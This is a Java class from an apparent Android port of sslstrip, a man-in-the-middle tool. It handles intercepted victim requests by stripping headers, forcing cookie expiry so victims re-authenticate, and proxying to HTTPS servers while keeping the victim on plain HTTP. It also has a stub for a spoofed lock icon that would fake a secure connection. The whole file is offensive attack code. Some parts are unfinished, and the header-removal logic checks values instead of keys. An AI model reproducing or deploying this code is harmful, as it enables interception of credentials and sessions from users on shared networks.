package com.crazyricky.androidsslstrip.sslstrip;

import java.util.ArrayList;
import java.util.Properties;

import com.crazyricky.androidsslstrip.NanoHTTPD;
import com.crazyricky.androidsslstrip.NanoHTTPD.Response;

public class ClientRequest {
    private URLMonitor mUrlMonitor;
    private CookieCleaner mCookieCleaner;
    
    private ClientRequest() {
        mUrlMonitor = URLMonitor.getInstance();
        mCookieCleaner = CookieCleaner.getInstance();
    }
    
    public Properties cleanHeaders() {
        Properties headers = (Properties) getHeaders().clone();
        
        if (headers.contains("accept-encoding")) {
            headers.remove("accept-encoding");
        }

        if (headers.contains("if-modified-since")) {
            headers.remove("if-modified-since");
        }
        
        if (headers.contains("cache-control")) {
            headers.remove("cache-control");
        }
        return headers;
    }
    
    public String getPathFromUri() {
        String uri = getUri();
        if (uri.indexOf("http://") == 0) {
            int index = uri.indexOf("/", 7);
            return uri.substring(index, uri.length());
        }
        return uri;
    }
    
    public String getPathToLockIcon() {
        // TODO :
        return "lock.ico";
    }
    
    public Response handleHostResolvedSuccess(String address) {
        String host = getHeader("host");
        Properties headers = cleanHeaders();
        String client = getClientIP();
        String path = getPathFromUri();
        
        String url = "http://" + host + path;

        String method = mMethod;
        if (!mCookieCleaner.isClean(method, client, host, headers)){
            return sendExpiredCookies(host, path, mCookieCleaner.getExpireHeaders(method, client,host, headers, path));
        } else if (mUrlMonitor.isSecureFavicon(client, path)) {
            // TODO :
            // return sendSpoofedFaviconResponse();
            return null;
        } else if (mUrlMonitor.isSecureLink(client, url)) {
            return proxyViaSSL(url, method,  getData(), headers, mUrlMonitor.getSecurePort(client, url));
        } else {
            return proxyViaHTTP(url, method, getData(), headers);
        }
    }
    
    public Response process() { 
        String host = getHeader("host");
        // TODO : handle fail case
        return handleHostResolvedSuccess(host);
    }
    
    public Response proxyViaHTTP(String url, String method, byte[] postData, Properties headers) {
        return new ServerConnection(getClientIP(), url).sendViaHttp( method, headers, postData);
    }
    
    public Response proxyViaSSL(String url, String method, byte[] postData, Properties headers, int port) {
        String httpsUrl = url;
        httpsUrl = httpsUrl.replaceFirst("http://", "https://"); 
        return new SSLServerConnection(getClientIP(), httpsUrl).sendViaHttp( method, headers, postData);
    }
    
    public Response sendExpiredCookies(String host, String path, ArrayList<String> expireHeaders) {
        Response res = new Response();
        res.status = NanoHTTPD.HTTP_MOVED;
        res.addHeader("Connection", "close");
        res.addHeader("Location", "http://" + host + path);
        for (String header : expireHeaders) {
            res.addHeader("Set-Cookie", header);
        }
        return res;
    }
    
    public void sendSpoofedFaviconResponse() {
        // TODO:
//        icoFile = open(self.getPathToLockIcon())
//
//        self.setResponseCode(200, "OK")
//        self.setHeader("Content-type", "image/x-icon")
//        self.write(icoFile.read())
//                
//        icoFile.close()
//        self.finish()
    }

    // Custom code
    
    Properties mHeaders = null;
    String mUri = null;
    String mClientIP = null;
    byte[] mData = null;
    String mMethod = null;
    
    String getHeader(String key) {
        return mHeaders.getProperty(key);
    }
    Properties getHeaders() {
        return mHeaders;
    }
    String getUri() {
        return mUri;
    }
    String getClientIP() {
        return mClientIP;
    }
    byte[] getData() {
        return mData;
    }
    
    public static ClientRequest newInstance(Properties headers, String uri, String clientIP, byte[] data, String method) {
        ClientRequest result = new ClientRequest();
        result.mHeaders = headers;
        result.mUri = uri;
        result.mData = data;
        result.mMethod = method;
        result.mClientIP = clientIP;
        return result;
    }
}
